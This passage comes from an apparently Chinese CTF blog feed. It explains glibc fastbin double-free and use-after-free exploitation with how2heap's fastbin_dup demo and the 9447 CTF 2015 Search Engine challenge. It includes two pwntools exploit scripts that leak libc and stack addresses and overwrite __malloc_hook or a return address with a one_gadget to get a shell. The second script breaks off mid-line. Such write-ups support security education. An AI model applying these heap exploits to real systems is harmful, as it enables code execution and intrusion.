chunk覆盖到fastbin的fd处，因为这样将要申请的chunk大小为0x7f3bc9f52b00-&gt;size=0x00007f3bc9c13a00，明显远大于fastbin大小，这样会导致程序崩溃。</p><p>注意到0x7f是固定的，并且0x7f也位于fastbin范围(0x20~0x80)之内，所以稍微改变一点偏移就可以将0x7f移动到fake chunk的size处。</p><p>计算偏移：</p><p>0x7f3bc9f52b10 - 0x7f3bc9f52af5 + 0x8 = 0x1b + 0x8 = 0x23</p><p>然后通过libc计算one_gadget，本地环境可以通过<code>ldd --version</code>查看libc版本。</p><p>覆盖后的内存分布如下：<br><img src="https://i.imgur.com/rp2ZKy2.png" alt=""></p><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">p = process(<span class="string">'./double'</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">malloc_hook = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new</span><span class="params">(s)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'1'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'Your data:\n'</span>,s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'2'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'index: '</span>,index)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index,s)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'3'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'index: '</span>,index)</span><br><span class="line">p.sendline(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(index)</span>:</span></span><br><span class="line">p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'4'</span>)</span><br><span class="line">p.sendlineafter(<span class="string">'index: '</span>,index)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_libc</span><span class="params">()</span>:</span></span><br><span class="line">        <span class="keyword">global</span> malloc_hook</span><br><span class="line">new(<span class="string">'a'</span>*<span class="number">0x100</span>)</span><br><span class="line">new(<span class="string">'a'</span>*<span class="number">0x100</span>)</span><br><span class="line">delete(<span class="string">'0'</span>)</span><br><span class="line">show(<span class="string">'1'</span>)</span><br><span class="line">main_arena88 = u64(p.recvn(<span class="number">6</span>)+<span class="string">'\x00'</span>*<span class="number">2</span>)</span><br><span class="line">malloc_hook = main_arena88 - <span class="number">88</span> - <span class="number">0x10</span></span><br><span class="line">libc = main_arena88 - <span class="number">0x3c4b78</span></span><br><span class="line">        <span class="keyword">return</span> libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fastbin_attack</span><span class="params">(fake_chunk,one_gadget)</span>:</span></span><br><span class="line">        new(<span class="string">'b'</span>*<span class="number">0x60</span>) </span><br><span class="line">        new(<span class="string">'b'</span>*<span class="number">0x60</span>) </span><br><span class="line">        delete(<span class="string">'2'</span>) </span><br><span class="line">        payload1 = p64(fake_chunk).ljust(<span class="number">0x60</span>,<span class="string">'\x00'</span>)</span><br><span class="line">        edit(<span class="string">'3'</span>,payload1)</span><br><span class="line">        payload2 = <span class="string">'a'</span>*(<span class="number">0x13</span>)+p64(one_gadget)</span><br><span class="line">        payload2 = payload2.ljust(<span class="number">0x60</span>,<span class="string">'\x00'</span>)</span><br><span class="line">        new(<span class="string">'c'</span>*<span class="number">0x60</span>) </span><br><span class="line">        new(payload2) </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">libc_base = leak_libc()</span><br><span class="line">log.success(hex(libc_base))</span><br><span class="line">    log.success(hex(malloc_hook))</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    fake_chunk = malloc_hook - <span class="number">0x1b</span> - <span class="number">8</span></span><br><span class="line">    one_gadget = libc_base + <span class="number">0x4526a</span></span><br><span class="line">    fastbin_attack(fake_chunk,one)</span><br><span class="line">    p.sendlineafter(<span class="string">'&gt; '</span>,<span class="string">'1'</span>)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><p>参考 ：<strong><a href="https://bbs.pediy.com/thread-250962.htm" target="_blank" rel="noopener">https://bbs.pediy.com/thread-250962.htm</a></strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> writeup </tag>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fastbin attack</title>
      <link href="/2019/04/14/fastbin-attack/"/>
      <url>/2019/04/14/fastbin-attack/</url>
      
        <content type="html"><![CDATA[<p>Fastbin double free attack</p><a id="more"></a><p><strong><a href="https://github.com/shellphish/how2heap/blob/master/fastbin_dup.c" target="_blank" rel="noopener">fastbin_dup</a></strong></p><h1 id="fastbin"><a href="#fastbin" class="headerlink" title="fastbin"></a>fastbin</h1><p>fastbin中的chunk是单链表结构。由于在free一个chunk时，libc只会检查此chunk是否和fastbin中第一个chunk是同一个，是的话则会报错(double free or corruption (fasttop))，所以在两次free同一个chunk间再free另一个chunk就不会被检测到。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"This file demonstrates a simple double-free attack with fastbins.\n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Allocating 3 buffers.\n"</span>);</span><br><span class="line"><span class="keyword">int</span> *a = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *b = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"><span class="keyword">int</span> *c = <span class="built_in">malloc</span>(<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, b);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p\n"</span>, c);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Freeing the first one...\n"</span>);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"If we free %p again, things will crash because %p is at the top of the free list.\n"</span>, a, a);</span><br><span class="line"><span class="comment">// free(a);</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"So, instead, we'll free %p.\n"</span>, b);</span><br><span class="line"><span class="built_in">free</span>(b);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now, we can free %p again, since it's not the head of the free list.\n"</span>, a);</span><br><span class="line"><span class="built_in">free</span>(a);</span><br><span class="line"></span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"Now the free list has [ %p, %p, %p ]. If we malloc 3 times, we'll get %p twice!\n"</span>, a, b, a, a);</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"1st malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"2nd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"3rd malloc(8): %p\n"</span>, <span class="built_in">malloc</span>(<span class="number">8</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一开始申请了3个chunk，之后free的顺序为<strong>a-&gt;b-&gt;a</strong>，此时再申请三个chunk就会发现返回的第一个和第三个指针指向的是同一个chunk，也就是a chunk。</p><p><img src="https://i.imgur.com/3yrP7Nu.png" alt=""><br>第一次free之前，堆中chunk的情况，申请的8字节加上头部8字节再加prev_inuse一字节所以size为17字节。</p><p><img src="https://i.imgur.com/DsFYPlx.png" alt=""><br>第一次free后，a chunk插入到fastbin中。</p><p><img src="https://i.imgur.com/Rkx6YVt.png" alt=""><br>第二次free后，b chunk插入到fastbin首部。</p><p><img src="https://i.imgur.com/Yamwdfu.png" alt=""><br>第三次free后，a chunk再次插入到fastbin首部。</p><p>三次free过程的示意图：<br><img src="https://i.imgur.com/wdvhZII.png" alt=""></p><p>紧接着是三次malloc，示意图如下：<br><img src="https://i.imgur.com/j5hZSBe.png" alt=""></p><p>通过double free，现在得到了两个指向同一个chunk的指针。如果在第一次malloc之后，修改原本位于fd处的值为某一地址(addr_evil)，第三次malloc后，得到的指针就指向了该地址(addr_evil)，利用程序提供的功能(如果有的话)可以在该地址上写任意值。</p><p>下面一道例题具体说明如何利用double free漏洞</p><h1 id="9447-CTF-2015-Search-Engine"><a href="#9447-CTF-2015-Search-Engine" class="headerlink" title="9447 CTF 2015: Search Engine"></a>9447 CTF 2015: Search Engine</h1><p>题目： <strong><a href="https://github.com/ctfs/write-ups-2015/tree/master/9447-ctf-2015/exploitation/search-engine" target="_blank" rel="noopener">https://github.com/ctfs/write-ups-2015/tree/master/9447-ctf-2015/exploitation/search-engine</a></strong></p><h2 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h2><p>程序提供了输入句子和查找单词的功能，如果查找的单词存在于输入过的句子中，则可以删掉该句子。程序将以空格为间隔字符串视为单词。下面是一个例子：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">1: Search with a word</span><br><span class="line">2: Index a sentence</span><br><span class="line">3: Quit</span><br><span class="line">2</span><br><span class="line">Enter the sentence size:</span><br><span class="line">8</span><br><span class="line">Enter the sentence:</span><br><span class="line">aaa bb c</span><br><span class="line">Added sentence</span><br><span class="line">1: Search with a word</span><br><span class="line">2: Index a sentence</span><br><span class="line">3: Quit</span><br><span class="line">1</span><br><span class="line">Enter the word size:</span><br><span class="line">1</span><br><span class="line">Enter the word:</span><br><span class="line">c</span><br><span class="line">Found 5: aaa bb c</span><br><span class="line">Delete this sentence (y/n)?</span><br><span class="line">y</span><br><span class="line">Deleted!</span><br><span class="line">1: Search with a word</span><br><span class="line">2: Index a sentence</span><br><span class="line">3: Quit</span><br></pre></td></tr></table></figure><p><img src="https://i.imgur.com/YrMVBLw.png" alt=""></p><p>从堆可以看出，我们输入的句子(<strong>aaa bb c</strong>)被拆成了三个单词，每个单词作为一个word结构体依次存放在堆中。该单词和其对应句子的信息被存放在结构体中。所有的word组成了一个words_list。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">word</span>&#123;</span></span><br><span class="line"><span class="keyword">char</span> *word_ptr;<span class="comment">//指向单词所在的句子中该单词的起始位置</span></span><br><span class="line"><span class="keyword">int</span> word_len; <span class="comment">//单词长度</span></span><br><span class="line"><span class="keyword">char</span> *sentence;<span class="comment">//指向单词所在的句子首部</span></span><br><span class="line"><span class="keyword">int</span> sentence_len; <span class="comment">//句子长度</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">word</span> *<span class="title">next</span>;</span> <span class="comment">//指向链表中下一个word节点</span></span><br><span class="line">&#125;;<span class="comment">//共40字节</span></span><br></pre></td></tr></table></figure><p>分析了word结构体之后再看search函数就很容易了，于是我们可以得到更清晰的版本：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> size;</span><br><span class="line"><span class="keyword">void</span> *tmp_word;</span><br><span class="line">size = read_int();</span><br><span class="line">tmp_word = <span class="built_in">malloc</span>(size);</span><br><span class="line">_input(tmp_word, size, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">char</span> choice;</span><br><span class="line"><span class="keyword">for</span>(i = word; i; i = i-&gt;next)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(*i-&gt;sentence)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(i-&gt;word_len == size &amp;&amp; !<span class="built_in">memcmp</span>(i-&gt;word_ptr, tmp_word, size))</span><br><span class="line">&#123;</span><br><span class="line">__printf_chk(<span class="number">1L</span>L; <span class="string">"Found %d: "</span>, i-&gt;sentence_len);</span><br><span class="line">fwrite(i-&gt;sentence, <span class="number">1u</span>LL, i-&gt;sentence_len, <span class="built_in">stdout</span>);</span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">'\n'</span>);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Delete this sentence (y/n)?"</span>);</span><br><span class="line">_input(&amp;choice, <span class="number">2</span>, <span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span>(choice == <span class="string">'y'</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">memset</span>(i-&gt;sentence, <span class="number">0</span>, i-&gt;sentence_len);</span><br><span class="line"><span class="built_in">free</span>(i-&gt;sentence);</span><br><span class="line"><span class="built_in">puts</span>(<span class="string">"Delete!"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">free</span>(tmp_word);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>search函数在查找单词的时候先通过判断sentence指向的句子是否为空，若非空则可以进一步查找并通过memset将句子内容清零，然后free掉句子对应的chunk来删除句子。但是如果我们申请足够大的一个sentence chunk，在free掉该chunk时仍会保留fd和bk指针，由于该fd，bk指针位于sentence首部，所以如再进行search查找单词，就可以直接绕过检测句子是否为空的判断，从而触发UAF漏洞。</p><h2 id="leak-stack"><a href="#leak-stack" class="headerlink" title="leak_stack"></a>leak_stack</h2><p>还有一个漏洞存在于read_int函数，大致如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">read_int</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> result;</span><br><span class="line"><span class="keyword">char</span> *endptr;</span><br><span class="line"><span class="keyword">char</span> nptr[<span class="number">48</span>];</span><br><span class="line"></span><br><span class="line">_input(nptr, <span class="number">48</span>, <span class="number">1</span>);</span><br><span class="line">result = strtol(nptr, &amp;endptr, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(endptr == nptr)</span><br><span class="line">&#123;</span><br><span class="line">__printf_chk(<span class="number">1L</span>L, <span class="string">"%s is not a valid number\n"</span>, nptr);</span><br><span class="line">result = read_int();</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>该函数接收一个至多48字节的字符串，转化成数字后返回。如果转化失败则会打印该字符串。漏洞就在于：如果输入字符串长度为48字节，那么_input函数就没有办法在该字符串最后添加空字符，从而导致在打印该字符串时泄露栈中后面的数据。</p><p>但是有一点要注意，在利用这个漏洞时，第一次泄露会失败，因为栈中字符串后面刚好是空字符中断了打印，但由于该函数是递归调用的，我们可以再次输入48字节的字符串，通过累加栈帧的方式再次泄露栈中的数据。</p><p><img src="https://i.imgur.com/NtnJJJ7.png" alt=""></p><p>可以看到第一个栈帧(橙色)，后面是\x00，递归调用一次后，可以泄露出<strong>0x00007fffffffe3e0</strong>，再通过计算偏移，可以找到返回值所在的位置。</p><p><img src="https://i.imgur.com/NXd0TqW.png" alt=""><br>泄露出了数据</p><h2 id="leak-libc"><a href="#leak-libc" class="headerlink" title="leak_libc"></a>leak_libc</h2><p>刚才提到了UAF，触发UAF的条件是申请一个大于fastbin大小的chunk然后free掉该chunk，该chunk会被添加到unsorted bin中，并且fd和bk会指向<strong>main_arena</strong>中，通过泄露fd，bk得到<strong>main_arena</strong>，结合偏移计算出libc基址。libc中的main_arena偏移可以在libc中的malloc_trim()函数中找到。</p><p><img src="https://i.imgur.com/Gi3CUHx.png" alt=""></p><p>例如现在申请一个chunk。</p><p><img src="https://i.imgur.com/HXxFdl3.png" alt=""></p><p>free掉之后，fd和bk都指向<strong>main_arena+88</strong>中。通过程序提供的search函数泄露该值。</p><p>大致过程如下<br><img src="https://i.imgur.com/hzK1fsw.png" alt=""></p><p>此时用search查找4个\x00就会绕过第一个if判断，并且由于sentence已经置零，所以\x00也会在bbbb处匹配成功，从而进入第二个if语句内部，打印出fd，bk的值。</p><p>如果题目给了libc文件可以直接用ida打开找到malloc_trim函数查看main_arena偏移，由于这道题是本地环境，所以直接用ldd查看使用的libc版本再找到main_arena偏移。</p><h2 id="double-free"><a href="#double-free" class="headerlink" title="double free"></a>double free</h2><p>有了stack和libc，相当于有了纸和笔，还差一个写的动作将libc中的system写到栈上。</p><p>先申请三个chunk，分别包含</p><p><strong> ‘A’*50 + ‘ d’ </strong></p><p><strong> ‘B’*50 + ‘ d’ </strong></p><p><strong> ‘C’*50 + ‘ d’ </strong></p><p>然后查找<strong>d</strong>，依次free掉三个chunk。这时的fastbin：<strong>fastbin HEAD -&gt; A -&gt; B -&gt; C -&gt; NULL</strong></p><p>接着再查找<strong>\x00</strong>，由于C chunk的fd为空，所以无法通过第一个if，再判断B chunk，由于存在fd，第一个if被绕过，此时可以选择free掉B chunk(第二次free掉B chunk，成功double free)。此时的fastbin：<br><strong>fastbin HEAD -&gt; B -&gt; A -&gt; B -&gt; C -&gt; NULL</strong></p><p>过程如图：<br><img src="https://i.imgur.com/E9ikH31.png" alt=""></p><p>这时malloc一次后我们会得到B chunk，向其中写入之前泄露的stack加上偏移(变成函数返回值所在的位置)，再malloc两次，依次得到A chunk和Bchunk，此时的fastbin指向的就是刚才写入的栈的值，再次malloc，就会得到一个指向该地址的指针，用one_gadget覆盖该返回地址，在程序退出时getshell。</p><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = 'debug'</span></span><br><span class="line"></span><br><span class="line">r = process(<span class="string">'./search-bf61fbb8fa7212c814b2607a81a84adf'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_stack</span><span class="params">()</span>:</span></span><br><span class="line">        r.recvuntil(<span class="string">'Quit\n'</span>)</span><br><span class="line">        r.sendline(<span class="string">'1'</span>)</span><br><span class="line">        r.recvuntil(<span class="string">'size:\n'</span>)</span><br><span class="line">        r.sendline(<span class="string">'a'</span>*<span class="number">48</span>)</span><br><span class="line">        r.recvuntil(<span class="string">'number\n'</span>)</span><br><span class="line">        r.sendline(<span class="string">'a'</span>*<span class="number">48</span>)</span><br><span class="line">        leak_stack = int(r.recvuntil(<span class="string">' is '</span>)[<span class="number">-10</span>:<span class="number">-4</span>][::<span class="number">-1</span>].encode(<span class="string">'hex'</span>),<span class="number">16</span>)</span><br><span class="line">        log.success(<span class="string">'stack: '</span>+hex(leak_stack))</span><br><span class="line">        r.sendline(<span class="string">'1'</span>)</span><br><span class="line">        r.recvuntil(<span class="string">'word:\n'</span>)</span><br><span class="line">        r.sendline(<span class="string">'A'</span>)</span><br><span class="line">        <span class="keyword">return</span> leak_stack</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">search</span><span class="params">(s)</span>:</span></span><br><span class="line">        r.recvuntil(<span class="string">'Quit\n'</span>)</span><br><span class="line">        r.sendline(<span class="string">'1'</span>)</span><br><span class="line">        r.recvuntil(<span class="string">'size:\n'</span>)</span><br><span class="line">        r.sendline(str(len(s)))</span><br><span class="line">        r.recvuntil(<span class="string">'word:\n'</span>)</span><br><span class="line">        r.sendline(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(s)</span>:</span></span><br><span class="line">        r.recvuntil(<span class="string">'Quit\n'</span>)</span><br><span class="line">        r.sendline(<span class="string">'2'</span>)</span><br><span class="line">        r.recvuntil(<span class="string">'size:\n'</span>)</span><br><span class="line">        r.sendline(str(len(s)))</span><br><span class="line">        r.recvuntil(<span class="string">'sentence:\n'</span>)</span><br><span class="line">        r.sendline(s)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(c)</span>:</span></span><br><span class="line">        r.recvuntil(<span class="string">'(y/n)?'</span>)</span><br><span class="line">        r.sendline(c)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak_libc</span><span class="params">()</span>:</span></span><br><span class="line">        index(<span class="string">'A'</span>*<span class="number">507</span>+<span class="string">' bbbb'</span>)</span><br><span class="line">        search(<span class="string">'bbbb'</span>)</span><br><span class="line">        delete(<span class="string">'y'</span>)</span><br><span class="line">        search(<span class="string">'\x00'</span>*<span class="number">4</span>)</span><br><span class="line">        r.recvuntil(<span class="string">': '</span>)</span><br><span class="line">        libc_addr = u64(r.recv(<span class="number">8</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line">        log.success(<span class="string">'libc: '</span>+hex(libc_addr))</span><br><span class="line">        delete(<span class="string">'n'</span>)</span><br><span class="line">        <span class="keyword">return</span> libc_addr</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">double_free</span><span class="params">(stack,libc)</span>:</span></span><br><span class="line">        <span class="comment">#malloc 3 chunk</span></span><br><span class="line">        index(<span class="string">'A'</span>*<span class="number">50</span>+<span class="string">' d'</span>)</span><br><span class="line">        index(<span class="string">'B'</span>*<span class="number">50</span>+<span class="string">' d'</span>)</span><br><span class="line">        index(<span class="string">'C'</span>*<span class="number">50</span>+<span class="string">' d'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#fastbin -&gt; A -&gt; B -&gt; C -&gt; NULL</span></span><br><span class="line">        search(<span class="string">'d'</span>)</span><br><span class="line">        delete(<span class="string">'y'</span>)</span><br><span class="line">        delete(<span class="string">'y'</span>)</span><br><span class="line">        delete(<span class="string">'y'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#fastbin -&gt;B -&gt; A -&gt; B -&gt; C -&gt; NULL</span></span><br><span class="line">        search(<span class="string">'\x00'</span>)</span><br><span class="line">        delete(<span class="string">'y'</span>)</span><br><span class="line">        delete(<span class="string">'n'</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#fastbin -&gt;B -&gt; A -&gt; B -&gt; evil -&gt; ?</span></span><br><span class="line">        index(p64(stack).ljust(<span class="number">52</span>))</span><br><span class="line">        index(<span 